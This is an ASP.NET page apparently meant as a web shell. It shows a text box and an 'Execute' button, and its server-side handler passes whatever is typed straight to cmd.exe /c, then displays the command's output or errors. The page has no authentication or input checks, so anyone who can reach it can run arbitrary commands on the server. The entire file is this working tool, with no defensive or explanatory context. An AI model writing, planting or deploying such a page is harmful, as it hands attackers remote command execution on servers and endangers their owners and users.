<%@ Page Language="C#" AutoEventWireup="true" %>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Execute Command</title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <asp:Label ID="lblCommand" runat="server" Text="Enter command:" />
            <br />
            <asp:TextBox ID="txtCommand" runat="server" Width="300px" />
            <br /><br />
            <asp:Button ID="btnExecute" runat="server" Text="Execute" OnClick="btnExecute_Click" />
            <br /><br />
            <asp:Label ID="lblOutput" runat="server" Text="Output will be displayed here." />
        </div>
    </form>
</body>
</html>

<script runat="server">
    protected void btnExecute_Click(object sender, EventArgs e)
    {
        try
        {
            string command = txtCommand.Text;

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            lblOutput.Text = Server.HtmlEncode(string.IsNullOrEmpty(error) ? output : error);
        }
        catch (Exception ex)
        {
            lblOutput.Text = "Error: " + Server.HtmlEncode(ex.Message);
        }
    }
</script>



